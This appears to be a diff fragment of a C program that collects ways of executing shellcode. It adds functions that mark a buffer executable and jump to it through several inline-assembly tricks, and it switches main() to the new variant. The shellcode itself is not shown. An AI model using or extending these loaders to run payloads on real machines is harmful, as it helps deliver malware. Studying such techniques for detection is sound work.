@@ -69,18 +69,54 @@ void RunShellCode_2()
 
 
 #ifndef _WIN64
+
 void RunShellCode_3()
 {
 	CodeBuffer Buffer = INIT_CODEBUFFER(shellcode);
 	ChangePageProtect(Buffer);
 	__asm
 	{
-		lea eax, shellcode;
-		jmp eax;
+		lea eax, shellcode
+		jmp eax
 	}
 }
 
 void RunShellCode_4()
+{
+	CodeBuffer Buffer = INIT_CODEBUFFER(shellcode);
+	ChangePageProtect(Buffer);
+	__asm
+	{
+		lea eax, shellcode
+		call eax
+	}
+}
+
+void RunShellCode_5()
+{
+	CodeBuffer Buffer = INIT_CODEBUFFER(shellcode);
+	ChangePageProtect(Buffer);
+	__asm
+	{
+		lea eax, shellcode
+		push eax
+		jmp dword ptr ds:[esp]
+	}
+}
+
+void RunShellCode_6()
+{
+	CodeBuffer Buffer = INIT_CODEBUFFER(shellcode);
+	ChangePageProtect(Buffer);
+	__asm
+	{
+		lea eax, shellcode
+		push eax
+		ret
+	}
+}
+
+void RunShellCode_7()
 {
 	CodeBuffer Buffer = INIT_CODEBUFFER(shellcode);
 	ChangePageProtect(Buffer);
@@ -118,7 +154,9 @@ int main()
 	//RunShellCode_3();
 	//RunShellCode_4();
 	//RunShellCode_5();
-	InjectShellCode_1();
+	//RunShellCode_6();
+	RunShellCode_7();
+	//InjectShellCode_1();
 
 #endif
 
